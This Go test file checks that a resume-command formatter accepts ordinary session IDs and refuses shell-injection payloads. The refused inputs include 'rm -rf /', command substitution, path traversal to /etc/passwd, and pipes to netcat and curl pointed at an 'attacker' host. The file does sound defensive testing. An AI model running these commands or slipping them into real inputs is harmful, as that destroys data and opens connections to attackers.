package amp

import (
	"testing"
)

func TestFormatResumeCommandEmpty(t *testing.T) {
	agent := New()
	if got := agent.FormatResumeCommand(""); got != "PLUGINS=all amp threads continue --last" {
		t.Fatalf("FormatResumeCommand(empty) = %q", got)
	}
}

func TestFormatResumeCommandValidID(t *testing.T) {
	agent := New()
	for _, id := range []string{
		"T-12345",
		"20260816_42",
		"session.01",
		"abc_DEF",
		"a:b-c_d.0",
	} {
		got := agent.FormatResumeCommand(id)
		want := "PLUGINS=all amp threads continue " + id
		if got != want {
			t.Fatalf("FormatResumeCommand(%q) = %q, want %q", id, got, want)
		}
	}
}

func TestFormatResumeCommandRefusesInjectionPayloads(t *testing.T) {
	agent := New()
	for _, id := range []string{
		`evil; rm -rf /`,
		`evil$(whoami)`,
		"evil`id`",
		"evil\nrm -rf /",
		"../etc/passwd",
		"~/evil",
		"evil|nc attacker 4444",
		"evil && curl attacker",
		"\x1b[31mansi\x1b[0m",
		"evil ",
		" evil",
	} {
		if got := agent.FormatResumeCommand(id); got != "" {
			t.Fatalf("FormatResumeCommand(%q) = %q, want empty (refused)", id, got)
		}
	}
}
